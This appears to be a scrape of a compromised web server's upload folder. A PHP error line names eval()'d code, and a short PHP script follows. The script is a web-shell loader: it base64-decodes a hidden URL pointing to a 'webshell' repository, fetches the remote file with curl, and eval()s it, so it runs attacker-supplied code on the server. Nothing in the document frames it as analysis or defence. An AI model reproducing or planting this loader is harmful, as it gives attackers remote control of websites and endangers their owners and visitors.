<br />
<b>Warning</b>:  ob_start(): output handler 'ob_gzhandler' conflicts with 'zlib output compression' in <b>/home/cpanel/sipandu/public_html/filebox/lampiran/index.php(15) : eval()'d code</b> on line <b>3245</b><br />
<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
$x= '?>';
      eval($x . get(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4cGxvaXQtaGF4b3Ivd2Vic2hlbGwvbWFpbi96ei5waHA=')));
?>
